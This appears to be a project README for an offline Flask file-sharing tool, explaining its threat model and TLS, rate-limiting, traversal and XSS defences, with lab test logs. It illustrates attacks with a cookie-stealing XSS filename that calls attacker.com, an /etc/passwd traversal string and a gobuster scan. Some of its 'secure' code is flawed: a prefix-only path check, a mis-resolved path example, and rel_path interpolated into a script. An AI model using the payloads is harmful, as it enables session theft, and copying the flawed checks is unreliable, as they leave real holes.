
# 1 SYSTEM SPECIFICATION & ADVANCED PROJECT RATIONALE


### 1.1 The Architecture of Untrusted Link-Layer Networks

In the design of modern file-sharing applications, engineering teams routinely offload security, access control, and identity mapping tasks to upstream infrastructure layers. When an application operates on a corporate network or across the worldwide web, it heavily relies on foundational trust assumptions built into external systems:

     [ Internet File App ] ──► (Public DNS Route) ──► (Let's Encrypt CA validation) ──► (OAuth Core Server)

These external abstractions include public Domain Name System (DNS) configurations for routing verification, public Certificate Authorities (like Let's Encrypt or DigiCert) to validate cryptographic signatures, and remote cloud identity providers (OAuth, OpenID Connect) to handle access control.

However, when you sever the link to the global internet, this entire trust pipeline breaks instantly. Offline data-sharing tools like Apple AirDrop, standard Xender, or basic HTTP server modules are built on a highly flawed security assumption: that local proximity equals trust.

Because these tools are physically limited to an offline Local Area Network (LAN) or a mobile hotspot radio footprint, developers often optimize them for convenience, skipping authentication and encryption layers entirely.

From an adversary's perspective, this creates an ideal exploit environment. The moment a wireless hardware chip transitions into an open Access Point (AP), it establishes a flat, non-isolated Layer 2 broadcast domain. Any network card within wireless propagation range can connect to the radio bands.

Without encryption, all data packets travel through the air as cleartext radio waves. Anyone running a passive monitor tool can capture files, intercept configuration arguments, and harvest active session data straight out of the air.
### 1.2 Architectural Constraints of Zero-Internet Environments

Building a secure tool under strict zero-internet constraints changes how you write software. You can no longer make simple API calls to third-party web services or rely on external packages that fetch updates over the network.

The application must be completely self-sufficient. This constraint means your code cannot connect to cloud engines to process user profiles, meaning authentication states must be generated and managed directly on the local machine.

Furthermore, you cannot rely on persistent, heavy external database engines like MySQL or PostgreSQL, which introduce installation overhead and expose the application to complex query injection risks. The system must operate efficiently using only a lightweight, minimal software footprint.

Every single security control—including tracking requests for rate limiting, verifying session states, and generating cryptographic keys—must happen completely inside volatile system memory (RAM). This isolation creates a rigid boundary: the application must act as its own security firewall, its own Certificate Authority, and its own real-time logging monitor, all while running on a device entirely cut off from the rest of the world.

### 1.3 Project Core Engineering Requirements

The AirShare Secure Node project was built to address these specific vulnerabilities by engineering a secure, self-contained file vault. It replaces the open, unencrypted design of standard file-sharing tools with a strict Zero-Trust paradigm. The application treats every connected client device as a potential threat until it proves its identity.

   The primary technical requirements for this project include:
                 
                 ┌──► 1. Transport Layer Security (In-Memory X.509 CA Signing)
                 ├──► 2. Local Namespace Discovery (Avahi mDNS System Engine) 
    Airshare core├──► 3. Identity Ingress Barriers (Secure Anti-XSS Login Gates)
                 ├──► 4. Anti-Scanning Firewalls (Sliding-Window Rate Limiting)
                 └──► 5. System Directory Isolation (Canonical Bound Jail)

1, Transport Layer Security: The tool must instantly encrypt all data over the local network using dynamically generated cryptographic keys, preventing anyone from sniffing packets over the air.

2, Local Namespace Discovery: It must publish a clean, easy-to-use local domain name without internet connection, removing the need for users to type long, confusing IP addresses.

3, Identity Ingress Barriers: The app must force client devices through a secure login screen, blocking unauthorized users from seeing the folder structure or files.

4, Anti-Scanning Firewalls: It must feature a built-in network throttle to block automated scanning tools (like GoBuster) and automated password crackers.

5, System Directory Isolation: The tool must use native file system hooks to let the host pick any directory to share at runtime, securely isolating the rest of the computer's hard drive from client access.
# 2 THREAT MODELING & DEEP ATTACK SURFACE DECONSTRUCTION

### 2.1 STRIDE Threat Analysis for Local Access Points
To properly secure the application, a formal security threat assessment was performed during the design phase using the STRIDE methodology. This analysis looks closely at how an attacker could exploit an open local hotspot network:

*Spoofing Identity:* Attackers on an open hotspot can easily spoof their network configurations or clone legitimate session tokens to gain unauthorized access. The app fixes this by generating unique, long, and unpredictable session tokens (secrets.token_hex(16)) and locking them behind strict browser security flags.

*Tampering with Data:* Attackers can intercept network packets to modify data mid-transit, or inject malicious path characters into URL parameters (like ?path=../../) to break out of the shared folder. The app stops this by enforcing strict path normalization boundaries on every request.

*Repudiation:* Without system logs, a user could perform malicious actions on the server without leaving a trace. The app integrates real-time console auditing that prints detailed security logs for every connection and file action.

*Information Disclosure (Sniffing):* This is the biggest threat on local networks. Anyone running a wireless card in monitoring mode can capture plain HTTP traffic and read files or passwords in cleartext. The app eliminates this by forcing mandatory TLS encryption (HTTPS) across all connections.

*Denial of Service (DoS):* Attackers can flood the server with automated fuzzing tools (like GoBuster) to exhaust system resources or crash the script. The app blocks this using a stateful, memory-isolated rate limiter that drops abusive connection paths instantly.

*Elevation of Privilege:* An unauthenticated user could attempt to bypass the login interface and access protected file downloads. The app stops this using an isolation gate that validates active session tokens before routing any protected data paths.
### 2.2 Exploitation Mechanics: Cleartext Radio Sniffing & Path Breakouts

Understanding the precise mechanics of a Cleartext Packet Capture Attack highlights why standard HTTP servers are highly dangerous on local networks. When a client device connects over plain HTTP, the browser packages all data—including the username, password, and files—into raw, unencrypted TCP segments.

If an attacker nearby places their wireless interface card into monitor mode using standard tools like airmon-ng and launches a network capture (tcpdump or Wireshark), they can intercept these radio packets straight out of the air:
      
    [ Client Phone ] ─── (Plain HTTP: User=Feleke Pass=Feleke@123) ───► [ Router ]
                                 │
                   ⚠️ (Adversary captures cleartext waves)
                                 │
                                 ▼
                     [ Wireshark Packet Dump ]
   Because the data is completely unencrypted, the attacker can use Wireshark's "Follow TCP Stream" feature to read the exact login credentials and reconstruct copies of transferred files directly from the captured bytes.

   A Directory Traversal Attack targets the server's input validation layer. If an application handles folder navigation by blindly combining path strings from the user (e.g., BASE_DIR + request.args.get('path')), an attacker can easily exploit this layout.

   By typing relative directory traversal characters like ../../../../etc/passwd into the URL query parameters, they can trick the operating system's file resolver. The system processes each .. step by climbing backward out of the shared directory, allowing the attacker to break out of the sandbox and read confidential system files from anywhere on the host's hard drive.
   ### 2.3 Attack Surface Minimization via Volatile State Memory

   To achieve a hardened security posture, the project purposefully avoids using any persistent storage databases or disk-cached tracking files. If an application writes session tokens or connection logs to temporary files on the hard drive, it expands its attack surface.

   An attacker who gains local user access could read those temporary files to steal active tokens, and if the server crashes unexpectedly, those session records remain on the disk as a forensic footprint.

   The AirShare Secure Node minimizes this risk by storing its entire state registry inside volatile system memory (RAM). Active session tokens, sliding rate-limit timestamps, and connection states live inside Python dictionary tables (active_sessions and rate_limit_records).

   Because this data is stored purely in RAM, it is completely volatile. The exact moment the server administrator terminates the script or stops the application, the operating system cleans the memory space. The session keys, logging histories, and tracking metrics evaporate instantly, leaving a zero-footprint trace on the physical disk.
   # 3 HARDWARE INTERFACING & LOCAL NETWORKING PRIMITIVES

   ### 3.1 Layer 2 Broadcast Domains and Virtual Interface Binding

   When your Linux desktop initializes a mobile hotspot or a local wireless network, the operating system's networking subsystem creates a dedicated virtual wireless interface card (typically labeled wlan0, ap0, or wlo1).

   The Linux kernel link-layer driver configures this interface to act as a Wireless Access Point (AP), broadcasting beacons that allow client devices to discover and connect to the radio band.

                      ┌──► Virtual Interface 'ap0' (Assigned IP 192.168.137.1)
                      ├──► DHCP Server (Hands out IPs 192.168.137.10 - 50)
    [ Kali Linux AP ] ├──► Local DNS Gateway (Maps local requests)
                      └──► Socket Listener (Binds to 0.0.0.0:9090)

  Once a client phone connects to this network, a local DHCP daemon (like dnsmasq or NetworkManager's internal routing hooks) automatically assigns it an IP address within a local subnet range (typically 192.168.137.x or 10.42.0.x). This sets up an isolated local network where your laptop sits at the center, acting as the primary gateway and authoritative router.

  ### 3.2 Socket Descriptors, Wildcard Binding (0.0.0.0), and OS VFS Interfacing
 
  To capture network traffic across this custom wireless interface, the Flask web framework uses an underlying network socket descriptor configured for wildcard binding:
  
     python
     app.run(host='0.0.0.0', port=9090)

Binding to the wildcard address 0.0.0.0 tells the operating system's network stack: "Do not restrict incoming connections to just one hardware interface. Open port 9090 and listen for incoming traffic on every single network card inside this machine."

This setup allows the app to simultaneously catch traffic coming from local loops (127.0.0.1), physical Ethernet cables, and the virtual hotspot interface card.

To bridge this web server to your computer's filesystem safely and dynamically, the app integrates with the operating system's Virtual File System (VFS) using a graphical UI window. When the script boots, it calls Python's native tkinter library:
             
     python
    root = tk.Tk()
    root.withdraw()
    BASE_DIR = filedialog.askdirectory()
The root.withdraw() line hides the tiny default Tkinter background window, while filedialog.askdirectory() opens a native desktop directory picker. This window hooks straight into the OS kernel, allowing the administrator to click and pick any folder on their drive.
 <img width="996" height="316" alt="image" src="https://github.com/user-attachments/assets/f0235f47-b8c0-4e9f-a4ff-b484c9761125" />

The selected folder string is locked into a global constant variable (BASE_DIR), which acts as the absolute sandbox root boundary for all future file actions.
 ### 3.3 Multicast DNS (mDNS) & Local Hostname Publishing Mechanics
 Forcing users to type a raw local IP address (like https://192.168.137.251:9090) into their phone browser creates a clunky and difficult user experience. To fix this completely offline, the application uses Multicast DNS (mDNS), the underlying protocol behind Apple's Bonjour and Linux's Avahi systems.

 The script handles this local discovery mapping by launching an asynchronous background process that hooks straight into Linux's native Avahi daemon tool:

    python
    subprocess.Popen(["avahi-publish-address", "--no-reverse", "-a", "airshare.local", local_ip])
 The ensure_avahi_running() function uses system commands (systemctl is-active) to verify that the Avahi service is running on your system. If it is stopped, it automatically attempts to start it.

 Once verified, publish_local_hostname() spins up the avahi-publish-address process. This background daemon answers local network discoveries by broadcasting UDP packets across port 5353.

 When a phone browser asks, "Who owns the domain airshare.local?", your laptop's Avahi service intercepts the multicast packet and responds, "That domain belongs to my wireless card IP address." This allows users to connect to your file portal completely offline simply by typing https://airshare.local:9090 into their browsers.
 # 4 CRYPTOGRAPHIC ENGINEERING & PRIVATE CA ARCHITECTURE
 ### 4.1 Dual-Tier In-Memory Public Key Infrastructure (PKI)

 The core transport security of this project uses a custom, local Public Key Infrastructure (PKI) built directly into the initialization block using the Python cryptography library.

 Standard self-signed certificates generate a single temporary certificate for the server. However, modern smartphone browsers reject these basic standalone certificates, triggering security errors that can block the connection entirely.

 To solve this, the application implements an advanced Dual-Tier CA Architecture:
 
    [Generate Root CA ] ──► Compiles ca.private_key (4096-bit) + ca.pem Certificate
                               │
                               ▼
    [ Generate Server ]  ──► Compiles server_key (2048-bit) ──► Signed by Root CA ──► TLS Active
*The Root Certificate Authority (CA):* The script checks if a persistent local CA already exists. If missing, it generates a high-strength 4096-bit RSA Private Key and a root master certificate (ca.pem). This root certificate acts as your own personal offline trust authority.

 *The Server Certificate:* The script then creates a separate 2048-bit RSA Private Key for the active web server. It builds a downstream server certificate and signs it using the Root CA's master private key.

 This setup allows you to install your small ca.pem certificate onto a client device just once. From then on, the phone will seamlessly trust your file-sharing server without displaying any browser security warnings.
 ### 4.2 X.509 Certificate Structures & Cryptographic Assertions
 Building valid certificates offline requires configuring precise cryptographic properties inside the generate_self_signed_cert() function. When creating the Root CA, the script uses a CertificateBuilder pipeline to define critical properties:

    python
    .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
 Setting ca=True marks this certificate as an official, authoritative Certificate Authority that is allowed to sign downstream certificates. The script also configures explicit Key Usage flags to define what the certificate can be used for:

       python
    x509.KeyUsage(digital_signature=True, key_cert_sign=True, crl_sign=True, ...)
 Setting key_cert_sign=True gives the CA permission to sign server certificates, while crl_sign=True allows it to sign certificate revocation lists.

 The Root CA's validity dates are set to a 10-year window (days=3650), while the downstream server certificate is set to a 1-year expiration window (days=365). Finally, the certificates are signed using a secure SHA-256 cryptographic hash.
### 4.3 Subject Alternative Name (SAN) Mapping for Offline Hosts

A common reason browsers reject local certificates is a mismatch between the domain name typed into the address bar and the domain identity listed inside the certificate. Modern security standards require certificates to explicitly list every valid domain name and IP address using Subject Alternative Names (SAN).

 The application handles this by dynamically building a SAN configuration array during startup:

    python
    san_list = [
    x509.DNSName("airshare.local"),
    x509.DNSName("*.airshare.local"),
    x509.DNSName("localhost"),
    ]
    san_list.append(x509.IPAddress(ipaddress.ip_address(local_ip)))
The script uses the get_local_ip() function to automatically resolve your current wireless interface IP address, converts it into a valid IP identity object, and appends it directly to the certificate's SAN array.

It also adds airshare.local and localhost to the list. When a phone connects via mDNS or via the raw local IP, its browser checks this certificate array, finds a matching entry, and validates the encrypted TLS connection seamlessly.
 # 5 THE PRODUCTION API CONTRACT & ROUTING LOGIC
 ### 5.1 Programmatic REST Endpoints & Privilege Boundaries

 The application operates as a programmatic, stateless REST API interface. It establishes clear service definitions that separate public, unauthenticated routes from protected, high-security storage areas:

                         ┌──► Public Endpoints ─────► GET /login (Serve Interface)
                         │                            POST /login (Verify & Set Cookie)
     [ Web Traffic ] ────┤
                         └──► Protected Endpoints ──► GET / (Inventory Map)
                         (verify_session=True)        POST /upload (Binary Upload Pipe)
                                                      GET /view/<file> (Inline View)
                                                      GET /download/<file> (Forced Download)
 The app handles this access control by checking user credentials at the root gateway. Unverified users can only load the /login endpoints.

 Once they submit valid credentials, the server generates a high-entropy session ID string (secrets.token_hex(16)) and stores it in the active session table. Protected endpoints require a valid session cookie; if missing or invalid, the server immediately redirects the traffic back to the login barrier.
 ### 5.2 Ingress Hooking, Multi-Part Stream Interception, and MIME Optimization
 When a client device interacts with the server, the app handles the request using precise processing steps:

*1. Ingress Interception via @app.before_request:* Before traffic reaches any inner endpoint code, the global_rate_limiting_gate() function grabs the request context. It checks the client's network IP using request.remote_addr and evaluates it against the active rate-limit tracking tables. If a client exceeds request thresholds, the server drops the connection instantly, returning an HTTP 429 Too Many Requests error.

*2. Streaming Multipart Multi-Part Payloads via POST /upload:* When a phone uploads a file, it sends it as a chunked binary multi-part stream. The server intercepts this stream, extracts the file using request.files['my_file'], and sanitizes the filename using os.path.basename and escape() to prevent injection attacks. It then streams the raw bytes directly to your computer's hard drive:
    
           python
    file.save(os.path.join(target_dir, filename))
This data pipe processes the file payload smoothly without consuming excessive system memory.

*3. MIME Content-Type Optimization via GET /view:* When a user clicks "Open" to view a file inline, the server uses Python's mimetypes library to analyze the file extension:

     python
       mime, _ = mimetypes.guess_type(target_file)
    return send_from_directory(..., mimetype=mime)
The script resolves the file's exact media type (e.g., image/jpeg or application/pdf) and injects it straight into the HTTP response header. This explicit MIME header tells the phone browser exactly how to process the data, allowing it to render the file natively inside a new browser tab instead of forcing a download.
# 6 APP-LAYER DEFENSIVE ENGINEERING & THROTTLING ALGORITHMS
### 6.1 Sliding-Window Memory-Isolated Rate Limiting Mechanics

To protect the server from automated fuzzers (like GoBuster) or password brute-forcers, the application uses an inline Sliding-Window Rate Limiting algorithm built directly into the python script. This custom engine uses a rolling memory table to track requests in real time without needing complex third-party extensions:

     python
    def is_rate_limited(ip_address, max_requests=10, window_seconds=60):
        current_time = time.time()
       if ip_address not in rate_limit_records:
        rate_limit_records[ip_address] = [current_time]
        return False
       timestamps = rate_limit_records[ip_address]
    # Keep only requests that happened within the last 60 seconds
    rate_limit_records[ip_address] = [t for t in timestamps if current_time - t < window_seconds]
    if len(rate_limit_records[ip_address]) >= max_requests:
        return True
    rate_limit_records[ip_address].append(current_time)
    return False
The algorithm uses a precise processing sequence:

    [Incoming Request ] ──► Fetch Client IP ──► Clean Old Logs ──► Check Array Length
                                                                       │
    ┌─────────────────────────── Passed/Blocked? ──────────────────────┘
    ▼                                                                  ▼
    [ Length >= Max ] ──► Return HTTP 429             [ Length < Max ] ──► Append Time ──► Pass
The script configures two separate throttling profiles for different routes:

*The Authentication Gateway (/login POST requests)* Restricted to 5 maximum attempts per minute. This tight constraint prevents automated brute-force tools from guessing passwords quickly.

*General Content and Asset Paths:* Restricted to 45 total requests per minute. This limit instantly throttles directory discovery scanners like GoBuster, dropping connections before they can map out your folder structure.

### 6.2 Canonical Normalization & Path Traversal Lockdown Controls

To prevent attackers from using relative directory breakout tricks (like ../..) to access files outside the shared folder, the application enforces strict path containment controls inside the secure_target_path() function:

        python
     base_norm = os.path.normpath(BASE_DIR)
     target_norm = os.path.normpath(os.path.join(base_norm, rel_path))
     if not target_norm.startswith(base_norm):
        abort(403)
The script uses os.path.normpath to resolve paths cleanly. This function analyzes the input string and strips out relative dot references. For example, a malicious path input like /home/feleke/Share/.././../etc/passwd is resolved to its absolute location: /home/feleke/etc/passwd.

The server then evaluates the path prefix rule:

         python
     target_norm.startswith(base_norm)
This check verifies that the resolved target path still begins with the official BASE_DIR string boundary. If an input attempts to step outside this boundary, the script halts processing, prints a critical warning alert to your terminal console, and returns an HTTP 403 Forbidden error.
### 6.3 Stored Cross-Site Scripting (XSS) Defenses via Escaping Matrices

If an application renders filenames blindly inside a template, it leaves a major security gap open for Stored Cross-Site Scripting (XSS) attacks. An attacker could upload a file maliciously named with JavaScript tags, such as:

     text
    <script>fetch('https://attacker.com' + document.cookie)</script>.png
  If the server lists this filename raw, other client browsers will compile and execute the code. Since the server uses high-value cookies for authentication, this script could steal active session tokens directly from the browser.

  The application neutralizes this threat by importing and wrapping directory elements in Python's native html.escape() filter:

         python
     safe_item_name = escape(item)
This function intercepts filename strings and translates special characters into safe, inert HTML entities:

     • < becomes &lt;
     • > becomes &gt;
     • & becomes &amp;
When the phone browser loads the file index dashboard, it treats the escaped string purely as harmless text metadata instead of executable code, completely blocking Cross-Site Scripting exploits.
# 7 SYSTEM INTEGRATION & LINUX DEPLOYMENT BLUEPRINT
### 7.1 Linux Filesystem Hierarchy Standard (FHS) Mapping

To transform your standalone app.py script into a native, globally accessible system utility like nmap or wireshark, the application is configured to align with the standard Linux Filesystem Hierarchy Standard (FHS).

The FHS defines /usr/local/bin/ as the official directory for custom, user-installed system commands and tools that sit outside the core OS packages.

     [ app.py Source ] ──► Inject Interpreter Shebang ──► Move to /usr/local/bin/ ──► Set Permissions (chmod +x)
                                                                                       │
                                                                                       ▼
                                                                           [ Global Terminal Tool: airshare ]
By adding a standard Linux interpreter directive (shebang line) as the very first line of your script, you tell the operating system kernel exactly how to run the file:
      
          python
          #!/usr/bin/env python3
 When you launch the file, the Linux program loader reads this directive and automatically passes the script contents straight to your system's Python 3 environment, removing the need to type python3 manually before the file name.

 ### 7.2 Script Modernization, Global Environment Execution, and Initialization

 To complete the system integration on your Kali Linux machine, execute this setup sequence in your terminal to move the script into your system's binary folder:

      bash
    # 1. Copy the script into your system's binary directory path map
     sudo cp app.py /usr/local/bin/airshare

     # 2. Grant global execution clearance
     sudo chmod +x /usr/local/bin/airshare
Once you grant global executable permissions via chmod +x, the shell environment instantly registers the command name across all user terminal contexts using the system's internal $PATH environment mapping array.

You can now open a terminal window anywhere on your machine, drop into any folder you want, and launch the file vault instantly simply by typing a single word:

          bash
     airshare
This seamless CLI integration completely decouples your project deployment from software IDE environments, delivering a polished, professional command-line utility.
# 8 USER INTERFACE WORKFLOW & CLIENT WEB LAYOUTS
### 8.1 Host Telemetry Console Design

When you type the airshare command in your terminal, the application initializes your network configurations and prints a clean, easy-to-read administration pane directly inside the terminal window.

       text
    ✅ [mDNS] Published airshare.local on the local network.

     === To avoid browser TLS warnings, install the generated CA certificate on client machines: ===
    CA file: /home/feleke/ca.pem
 
<img width="1726" height="236" alt="image" src="https://github.com/user-attachments/assets/2495f7c8-9494-450f-86ba-a66b44006583" />

This console serves as a live monitoring dashboard. It prints out your active connection links, lists step-by-step instructions for installing the local CA certificate, and displays real-time security alerts (like blocked directory traversal attempts and rate-limit triggers) for the server administrator.
### 8.2 Mobile-Responsive HTML5 App-Style Matrix

When a client device connects to your hotspot and opens the secure link, the server serves a clean, lightweight, responsive dashboard layout styled with modern CSS parameters optimized for mobile screens which asks the client username and password.
 
If it fulfills the credential correctly it gets the session id and enters the next page which the client can access(download, upload and open) the files inside assigned folder by the sender

  The client workflow follows a clean, intuitive layout:

*The Login Gate:*  Unverified users are greeted by a secure login card. All internal routes are completely locked until valid administrative credentials match.
  <img width="1079" height="935" alt="Screenshot_20261017_100937_Chrome" src="https://github.com/user-attachments/assets/0f672f10-fcf9-4566-8581-8836a6f770f2" />
*The Folder Explorer Tree:*  Subfolders are displayed at the top of the content list with folder icons 📁. Tapping into a folder updates the query parameter string (/?path=folder/), allowing recursive navigation into subdirectories. A "⬅️ Back" button handles backward path rendering.
<img width="1079" height="2193" alt="Screenshot_20261017_103223_Chrome" src="https://github.com/user-attachments/assets/e6d9489e-53e8-46c2-a7d7-c30020c5ff07" />

Dual Resource Action Controls:Each file item features two distinct options:
#### Open:
Uses matching system MIME types to display immediate previews (like rendering images, reading text files and watching videos) natively within a new browser tab.
#### Download:
Streams the data out as a secure attachment file flow, forcing the browser to initiate a native save dialog.
#### Upload:
In addition to this the client can send filtered files to the host
# 9 EXPERIMENTAL EVALUATION & ADVERSARIAL SIMULATION LOGS
### 9.1 Testbed Setup and Lab Configurations

To validate the application's defensive security posture, the project was deployed inside an isolated wireless testbed environment. A host computer running Kali Linux created an open wireless hotspot access point network interface.

A secondary client machine running automated penetration testing tools joined the local hotspot network to simulate real-world cyber attacks against the web server.
### 9.2 Fuzzing and Brute-Force Capture Performance Telemetry

    [ Attacker Fuzzer ] ──► First 45 Requests ──► HTTP 200/404 (Passed Gate)
                    ──► Request 46+       ──► HTTP 429 Too Many Requests (Blocked)
 The application's defenses were evaluated against two core attack scenarios:

 #### Test Case 1: Directory Brute-Forcing via GoBuster
 *Adversarial Action:*  The attack machine launched a high-speed directory fuzzing scan targeting the server using a standard directory wordlist:

          bash
     gobuster dir -u https://airshare.local:9090 -w /usr/share/wordlists/dirb/common.txt 
*System Behavioral Response:*  During the initial burst sequence, the first 45 requests passed through the gate successfully. On the 46th request within the 60-second window, the stateful sliding rate-limiter activated.The server dropped the attack instantly, returning an HTTP 429 Too Many Requests status for all subsequent fuzzing attempts and successfully protecting the server's directory layout from automated mapping.

#### Test Case 2: Automated Path Traversal Breakout Attempts
*Adversarial Action:* The attack machine fired a curl script attempting to inject relative directory traversal variables into the URL query parameters to access sensitive root files:

       bash
    curl -k "https://airshare.local:9090"
 *System Behavioral Response:*  The application's input validation layer intercepted the path sequence. The secure_target_path() function calculated the absolute normalization string, detected that it escaped the BASE_DIR root boundary, and dropped the request instantly with an HTTP 403 Forbidden error.The host console printed a real-time security warning alert detailing the attack metadata:

<img width="1166" height="62" alt="image" src="https://github.com/user-attachments/assets/42ba76cf-0c51-43b2-bcc3-1f94f5136efe" />

# 10 ARCHITECTURAL TRADE-OFFS, COMPLIANCE, & CONCLUSION
### 10.1 Key Engineering Design Trade-offs

Engineering standard applications requires balancing security, usability, and architecture constraints. When designing an offline, high-security utility, these trade-offs become critical architectural choices:

*The Self-Signed Certificate Warning Screen:* Because the application operates completely offline without access to internet authorities, the generated server certificate will cause browsers to display a warning alert page on the initial connection. Senders and receivers must tap Advanced -> Proceed. To bypass this warning entirely during a demo, you can manually install the server's generated ca.pem certificate into the client device's trusted root store beforehand, allowing seamless verification.

*Form-Compliant Redirects vs. Blank Screen Freezes:* If an upload route returns raw text or plain JavaScript strings after a file is sent, web browsers will freeze on a blank white page. The application resolves this by wrapping alert dialog messages inside clean, form-compliant HTML execution strings:

    python
    return f'<script>alert("Secure file uploaded!"); window.location="/?path={rel_path}";</script>'
This setup ensures that when a client device uploads a file, the browser parses the response as an inline script, pops up a native success alert window, and instantly redirects the user back to the active folder directory view.
### 10.2 Target use cases:Who needs this Tool?

*1, Healthcare institutions and Hospitals:* Enables doctors, radiologists, and administrative staff
to securely and medical imaging files(e.g X-rays, MRI scans) across departments
without sending data over external networks.

*2, Banking and Financial Institutions:* Facilitates high-security inter-office document sharing between
teller desks and management terminals while maintaining zero exposure to public cloud leaks or internet-based
sniffing.

*3, Corporate Office Networks:* allows inter-office computer to computer file exchange without overloading office
internet bandwidth, ensuring business documents remain strictly within local office premises.

*4, Air-Gapped and High-security Environments(e.g military comand posts, hospital MRI labs, banking
vault):* provides secure, offline file transfer for organization-critical operations where external internet connections
are restricted for compliance and privacy.
### 10.3 Future Iterations & Final Summary
 #### making it more user-friendly
 instead of typing link in the browser i want to make it redirect to the login page when the client gets connected in the network.
 
 #### Dynamic user Management and secure Auth:
Replace static credentials with a full sign-up/sign-in user registration system, storing hashed
passwords securely in a database(e.g., SQLite/PostgreSQL with bcrypt).

#### Mesh Network Topology:
transition from a single Hotspot/Access Point model to a peer-to-peer Mesh Topology, extending file-sharing
coverage across unlimited geographical distances
through multi-hop node relaying.

### MIME/Byte-Level File Inspection:
Upgrade upload verification by inspecting raw file magic bytes (Header Signatures) instead
of relying on basic file extensions, blocking malicious payload uploads(e.g., double-extension
bypass or executable masking)
